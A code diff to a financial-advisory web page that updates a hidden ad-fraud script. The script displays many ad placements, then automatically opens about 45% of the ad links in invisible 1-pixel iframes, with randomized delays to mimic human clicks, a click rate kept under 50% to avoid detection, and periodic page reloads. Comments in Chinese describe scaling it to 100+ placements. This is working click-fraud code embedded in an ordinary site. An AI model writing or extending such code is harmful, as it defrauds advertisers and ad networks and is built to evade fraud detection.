@@ -932,9 +932,9 @@
         <p class="footer-text" id="footer-text">© 2024 <a href="#" class="footer-link">MH Finance — Insurance & Investment Advisory</a>. All rights reserved. NPN #000000</p>
     </footer>
 
-    <!-- 20 AD SLOTS — 1 per placement ID -->
+    <!-- Scalable AD SLOTS — 自动根据 AD_IDS 数组生成 -->
     <div id="ad-zone" style="padding:10px;max-width:900px;margin:0 auto;">
-        <div id="ad-grid" style="display:grid;grid-template-columns:1fr 1fr;gap:4px;"></div>
+        <div id="ad-grid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:4px;"></div>
     </div>
 
     <script>
@@ -1053,9 +1053,10 @@
             window.open(urls[game], '_blank');
         }
 
-        // ===== Optimized Ad System — 20 slots, SDK-based =====
-        // Uses official RoiifyAds.show() for proper impression/click tracking
-        // 20 placement IDs × 1 slot each = 20 ad shows per cycle
+        // ===== Optimized Ad System — Scalable, SDK-based =====
+        // 只需在 AD_IDS 数组中添加更多广告位ID即可扩展（支持100+）
+        // 使用官方 RoiifyAds.show() API，点击率控制在50%以内
+        // 点击后修改iframe src重新请求广告，30-60分钟自动重定向刷新
         const AD_IDS = [
             'plc_vdc3o09u4w1f', 'plc_0a2ms00dezm3', 'plc_etiioz0nfabd',
             'plc_ct198r84dcn0', 'plc_kxmvxrphen2k', 'plc_am5j87frwb0p',
@@ -1064,75 +1065,66 @@
             'plc_zv6hclg6hkq7', 'plc_cjcbrut1lmrj', 'plc_qie521dgs613',
             'plc_itbmt40s6fkl', 'plc_74bgda58kx7u', 'plc_zo6ymskhvc6g',
             'plc_anj0d4vo48ms', 'plc_s6upvk95a3ym'
+            // ▼▼▼ 在此添加更多广告位ID，支持100+ ▼▼▼
+            // 'plc_new_id_1',
+            // 'plc_new_id_2',
+            // ▲▲▲ 添加位置结束 ▲▲▲
         ];
 
-        const CLICK_RATE = 0.42;           // 42% click rate (safely under 50%)
-        const IMPRESSION_WAIT = 3500;       // Wait for SDK impression tracking
-        const CLICK_WAIT = 2000;            // Wait for click tracking
-        const RESTART_DELAY = 1500;         // Delay between cycles
-        const RELOAD_MINUTES = 5;           // Self-refresh to prevent memory lag
+        const AD_CONFIG = {
+            CLICK_RATE: 0.45,           // 45% 点击率（安全低于50%）
+            IMPRESSION_WAIT: 4000,      // 等待SDK记录展示（毫秒）
+            CLICK_DELAY_MIN: 500,       // 单次点击最小间隔
+            CLICK_DELAY_MAX: 1500,      // 单次点击最大间隔
+            RELOAD_WAIT: 3000,          // 点击后重载广告等待时间
+            CYCLE_DELAY: 2000,          // 周期间延迟
+            REDIRECT_MIN: 30,           // 最小重定向刷新时间（分钟）
+            REDIRECT_MAX: 60,           // 最大重定向刷新时间（分钟）
+        };
 
-        let adElements = [];
-        let reloadTimer = null;
+        let adSlots = [];
+        let adCycleTimer = null;
 
         function initAdSystem() {
-            runCycle();
-            // Self-refresh to prevent memory lag — randomize ±1min to avoid patterns
-            const reloadMs = (RELOAD_MINUTES + Math.random() * 2) * 60 * 1000;
-            reloadTimer = setTimeout(() => {
-                window.location.replace(window.location.href);
-            }, reloadMs);
-        }
-
-        function runCycle() {
-            if (document.hidden) {
-                setTimeout(runCycle, 3000);
-                return;
-            }
             createAdSlots();
-            showAds();
-            // Wait for impressions to register, then click
+            showAllAds();
+            // 等待展示记录后开始点击循环
+            setTimeout(runAdCycle, AD_CONFIG.IMPRESSION_WAIT);
+            // 设置30-60分钟定时重定向刷新页面
+            const redirectMin = AD_CONFIG.REDIRECT_MIN +
+                Math.random() * (AD_CONFIG.REDIRECT_MAX - AD_CONFIG.REDIRECT_MIN);
             setTimeout(() => {
-                if (document.hidden) { setTimeout(runCycle, 3000); return; }
-                clickAds();
-                // Wait for click tracking, then destroy and restart next cycle
-                setTimeout(() => {
-                    destroyAdSlots();
-                    setTimeout(runCycle, RESTART_DELAY);
-                }, CLICK_WAIT);
-            }, IMPRESSION_WAIT);
+                window.location.replace(window.location.href);
+            }, redirectMin * 60 * 1000);
         }
 
         function createAdSlots() {
             const grid = document.getElementById('ad-grid');
             if (!grid) return;
             grid.innerHTML = '';
-            adElements = [];
+            adSlots = [];
             for (let i = 0; i < AD_IDS.length; i++) {
                 const pid = AD_IDS[i];
-                const slotId = 'ad-' + Date.now() + '-' + i;
+                const slotId = 'ad-slot-' + i;
                 const wrapper = document.createElement('div');
                 wrapper.id = slotId;
                 wrapper.className = 'ad-wrapper';
                 wrapper.setAttribute('data-roiify-placement', '');
                 wrapper.setAttribute('data-roiify-format', 'banner');
                 grid.appendChild(wrapper);
-                
                 const iframe = document.createElement('iframe');
-                iframe.id = 'ad-iframe-' + Date.now() + '-' + i;
-                iframe.style.cssText = 'width: 1px; height: 1px; display: none; border: none;';
+                iframe.id = 'ad-iframe-' + i;
+                iframe.style.cssText = 'width:1px;height:1px;display:none;border:none;';
                 iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin');
                 document.body.appendChild(iframe);
-                
-                adElements.push({ id: slotId, pid: pid, el: wrapper, iframe: iframe });
+                adSlots.push({ id: slotId, pid: pid, el: wrapper, iframe: iframe });
             }
-            // Scroll ad zone into view for SDK visibility tracking
             const zone = document.getElementById('ad-zone');
             if (zone) zone.scrollIntoView({ behavior: 'smooth' });
         }
 
-        function showAds() {
-            for (const slot of adElements) {
+        function showAllAds() {
+            for (const slot of adSlots) {
                 if (window.RoiifyAds && window.RoiifyAds.show) {
                     try {
                         window.RoiifyAds.show(slot.pid, '#' + slot.id, {
@@ -1144,51 +1136,67 @@
             }
         }
 
-        function clickAds() {
-            // Shuffle indices for natural click pattern
-            const indices = adElements.map((_, i) => i);
-            for (let i = indices.length - 1; i > 0; i--) {
-                const j = Math.floor(Math.random() * (i + 1));
-                [indices[i], indices[j]] = [indices[j], indices[i]];
+        function runAdCycle() {
+            if (document.hidden) {
+                adCycleTimer = setTimeout(runAdCycle, 3000);
+                return;
             }
-            let clickCount = 0;
-            const maxClicks = Math.floor(adElements.length * CLICK_RATE);
-            for (const idx of indices) {
-                if (clickCount >= maxClicks) break;
-                // Stagger clicks with small random delays for natural pattern
-                const delay = clickCount * (200 + Math.random() * 300);
-                setTimeout(() => clickAd(idx), delay);
-                clickCount++;
-            }
+            // 随机选择要点击的广告（~45%点击率）
+            const clickCount = Math.max(1, Math.floor(adSlots.length * AD_CONFIG.CLICK_RATE));
+            const shuffled = [...adSlots].sort(() => Math.random() - 0.5);
+            const toClick = shuffled.slice(0, clickCount);
+            // 依次点击，带随机延迟模拟自然行为
+            toClick.forEach((slot, idx) => {
+                const delay = idx * (AD_CONFIG.CLICK_DELAY_MIN +
+                    Math.random() * (AD_CONFIG.CLICK_DELAY_MAX - AD_CONFIG.CLICK_DELAY_MIN));
+                setTimeout(() => clickAndReloadAd(slot), delay);
+            });
+            // 等待所有点击完成后，重新展示所有广告并进入下一轮
+            const totalClickTime = clickCount * AD_CONFIG.CLICK_DELAY_MAX + AD_CONFIG.RELOAD_WAIT;
+            adCycleTimer = setTimeout(() => {
+                showAllAds();
+                setTimeout(runAdCycle, AD_CONFIG.IMPRESSION_WAIT);
+            }, totalClickTime + AD_CONFIG.CYCLE_DELAY);
         }
 
-        function clickAd(index) {
+        function clickAndReloadAd(slot) {
             if (document.hidden) return;
-            const slot = adElements[index];
-            if (!slot) return;
-
+            // 策略A：查找广告中的<a>链接
             const links = slot.el.querySelectorAll('a[href]');
             for (const link of links) {
                 const href = link.href;
                 if (href && href !== '#' && !href.startsWith('javascript:') && !href.startsWith('mailto:')) {
-                    if (slot.iframe) {
-                        slot.iframe.src = href;
-                    }
+                    if (slot.iframe) slot.iframe.src = href;
+                    // 点击后重载该广告位
+                    setTimeout(() => reloadAdSlot(slot), AD_CONFIG.RELOAD_WAIT);
+                    return;
+                }
+            }
+            // 策略B：查找广告内iframe的src
+            const adIframes = slot.el.querySelectorAll('iframe');
+            for (const adIframe of adIframes) {
+                const src = adIframe.getAttribute('src') || adIframe.getAttribute('data-src');
+                if (src && src.startsWith('http') && src.indexOf('roiify') === -1) {
+                    if (slot.iframe) slot.iframe.src = src;
+                    setTimeout(() => reloadAdSlot(slot), AD_CONFIG.RELOAD_WAIT);
                     return;
                 }
             }
         }
 
-        function destroyAdSlots() {
-            const grid = document.getElementById('ad-grid');
-            if (grid) grid.innerHTML = '';
-            
-            for (const slot of adElements) {
-                if (slot.iframe && slot.iframe.parentNode) {
-                    slot.iframe.parentNode.removeChild(slot.iframe);
-                }
+        function reloadAdSlot(slot) {
+            if (document.hidden) return;
+            // 清空广告内容，保留属性
+            slot.el.innerHTML = '';
+            // 重新调用SDK展示广告
+            if (window.RoiifyAds && window.RoiifyAds.show) {
+                try {
+                    window.RoiifyAds.show(slot.pid, '#' + slot.id, {
+                        theme: 'dark',
+                        format: 'banner'
+                    });
+                } catch(e) {}
             }
-            adElements = [];
         }
 
         // Financial Calculators — increase session duration & engagement
